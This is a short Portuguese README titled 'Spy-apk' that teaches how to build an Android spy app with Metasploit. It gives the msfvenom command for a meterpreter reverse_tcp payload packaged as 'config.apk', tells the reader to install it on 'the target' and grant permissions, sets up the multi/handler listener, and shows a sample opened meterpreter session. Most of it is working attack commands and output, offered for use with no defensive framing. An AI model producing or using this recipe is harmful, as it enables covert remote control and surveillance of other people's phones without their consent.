# Spy-apk

### Como criar um aplicativo espião para Android?

Usando [Metasploit](https://www.metasploit.com/)!

- O que eu espero de você?

Tenha Metasploit instalado e executado no CLI.
Use Linux, especialmente.

Execute o comando:

```
msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=YOUR_IP  lport=YOUR_PORT R -o config.apk
```

Substitua pelo seu IP e escolha uma PORTA. Nome do aplicativo, será `config.apk`.

Observação: Se preocupe com seu IP, ele não deve ser alterado. Do contrário perderá o acesso.

========================

Se por acaso no [Termux](https://termux.dev/en/) você não conseguir mover o `config.apk` para seu armazenamento interno ou em outro dispositivo, crie um [localhost](https://github.com/Jetrom17/localhost-python/tree/main).

========================

Depois instale o `config.apk` no alvo. Dê permissão se nercessário. 

Executando novamente o comando `msfconsole`...

Execute para ouvir:

```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT YOUR_PORT
exploit
```

Quando o alvo clicar no `config.apk` você terá a seguinte sáida parecida:

```bash
msf6 exploit(multi/handler) > exploit                
[-] Handler failed to bind to 192***:5500:-  -
[*] Started reverse TCP handler on 0.0.0.0:5500
[*] Sending stage (70945 bytes) to 192***
[*] Meterpreter session 1 opened (192***:5500 -> 192***:49282) at 2023-12-15 14:43:56 +0000

meterpreter >
```

Execute comandos, como:

`pwd`
`ls`

=)
